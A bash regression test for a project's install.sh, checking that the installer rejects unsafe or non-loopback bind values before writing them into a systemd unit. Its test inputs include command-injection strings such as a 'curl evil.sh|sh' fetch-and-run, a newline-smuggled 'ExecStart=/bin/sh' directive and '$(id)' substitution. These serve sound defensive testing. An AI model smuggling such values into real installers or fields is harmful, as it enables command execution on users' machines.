#!/usr/bin/env bash
# check-install-sh — regression tests for install.sh's preflight guards.
#
# Run:  bash scripts/check-install-sh.sh
# CI:   .github/workflows/ci.yml `static` job
#
# Why this exists: install.sh is the file most users execute (`curl | bash`),
# and until now it was only exercised on the macOS smoke runner — the Linux
# path had no coverage at all. Two of its preflight guards are load-bearing
# security behaviour rather than convenience:
#
#   * $BIND is interpolated into the systemd unit's ExecStart, so an
#     unsanitised value could append CLI flags or inject unit directives.
#     install.sh screens it against a character allowlist.
#   * Loopback-only is the project's whole security stance (the binary has no
#     authentication and has refused non-loopback binds since v0.2.0). The
#     installer refuses early so the failure is legible.
#
# Both are pure shell with no network and no systemd, so they are cheap to
# assert. Everything runs against a temp prefix with MOBILE_CC_SKIP_UNIT=1 —
# this never touches the caller's ~/.local/bin or systemd units.

set -uo pipefail

cd "$(dirname "$0")/.."
SCRIPT=install.sh
fails=0
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT

run_install() { # $1 = BIND value
  MOBILE_CC_BIND="$1" \
  MOBILE_CC_PREFIX="$TMP/bin" \
  MOBILE_CC_SKIP_UNIT=1 \
  MOBILE_CC_BIN_FILE=/bin/true \
    bash "$SCRIPT" >/dev/null 2>&1
}

refuses() { # a value install.sh must reject
  if run_install "$1"; then
    printf 'error: BIND %q was ACCEPTED but must be refused\n' "$1" >&2
    fails=$((fails + 1))
  fi
}

accepts() { # a value install.sh must accept
  if ! run_install "$1"; then
    printf 'error: BIND %q was REFUSED but must be accepted\n' "$1" >&2
    fails=$((fails + 1))
  fi
}

# --- 0. the script parses -----------------------------------------------
if ! bash -n "$SCRIPT"; then
  echo "error: $SCRIPT does not parse" >&2
  fails=$((fails + 1))
fi

# --- 1. metacharacters that could reach the systemd unit ----------------
refuses '127.0.0.1:7800 --allow-public-bind'   # extra CLI flag
refuses '127.0.0.1:7800
ExecStart=/bin/sh'                             # newline → extra unit directive
refuses '127.0.0.1:7800;curl evil.sh|sh'       # command separator
refuses '$(id)'                                # command substitution
refuses '`id`'                                 # backtick substitution

# --- 2. the loopback-only policy ----------------------------------------
refuses '0.0.0.0:7800'
refuses '192.168.1.5:7800'
refuses 'example.com:7800'

# --- 3. legitimate binds still work -------------------------------------
accepts '127.0.0.1:7800'
accepts 'localhost:9000'
accepts '[::1]:7800'

# --- 4. happy path actually installs ------------------------------------
rm -rf "$TMP/bin"
if run_install '127.0.0.1:7800'; then
  if [ ! -x "$TMP/bin/mobile-cc" ]; then
    echo "error: happy path exited 0 but did not install an executable at \$PREFIX/mobile-cc" >&2
    fails=$((fails + 1))
  fi
else
  echo "error: happy path (MOBILE_CC_BIN_FILE + SKIP_UNIT) failed" >&2
  fails=$((fails + 1))
fi

echo
echo "install.sh check: ${fails} error(s)"
[ "$fails" -eq 0 ]
